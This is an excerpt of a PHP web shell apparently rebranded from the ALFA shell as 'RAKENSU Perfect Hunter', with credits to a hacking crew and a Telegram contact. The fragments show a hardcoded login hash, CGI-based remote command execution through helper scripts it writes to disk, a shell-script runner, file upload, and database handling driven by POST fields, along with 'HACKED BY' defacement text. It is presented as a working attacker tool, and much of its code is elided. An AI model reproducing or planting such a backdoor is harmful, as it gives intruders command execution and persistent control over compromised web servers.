...
$GLOBALS['RAKENSU'] = array(
    'username' => 'VATHAN',
    'password' => '4778da8262a3efefdf07872aaac23779',
    'safe_mode' => '0',
    'login_page' => 'gui',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['RAKENSU'];
...
define("__ALFA_DATA_FOLDER__", "RAKENSU");
...
<center><img style="border-radius:100px;"width="500" height="250" alt="RAKENSU Perfect Hunter" draggable="false" src="https://s12.gifyu.com/images/bkXmo.gif" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>RAKENSU Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["VATHAN"])){
			if(!@file_exists("VATHAN/".$_COOKIE["VATHAN"].".haxor")){
				$recreate = true;
				$lang = $_COOKIE["VATHAN"];
			}
		}
		if(!isset($_COOKIE["VATHAN"])||$recreate){
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/VATHAN/".$lang.$cgi_ext;
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ RAKENSU Perfect Hunter ::..</title>
<style type="text/css">';?>
...
function __showicon($r){
	...
	$s['loader']='https://gifyu.com/image/bhaJb';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://haxor.lol/love/RAKENSU-Perfect-Hunter-transformed.png'><br>
<font color='#FFFFFF'>Shell ReCoded By HaxorWorld (LPH TEAM)</font><br>
<font color='#00A220'>Contact : haxor@RAKENSUperfecthunter.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["VATHAN"])&&!isset($_COOKIE["VATHAN"])){
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ RAKENSU &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY HAXORWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>VATHAN VS EVERYBODY</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/idaman_cungkok'>@RAKENSU</a></span></div></td>
</tr>
</table>
</div>
...
if(isset($_POST['alfa6'])){
$s0levisible="Powered By RAKENSU Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.pinimg.com/736x/5c/3e/96/5c3e969d0eecf219c0783b1479220c69.jpg\"></p>";
...
$bash_users  = alfaEx("cd ".$tmp_path."/VATHAN;sh basedir.haxor ".$makepwd,false,true,true);
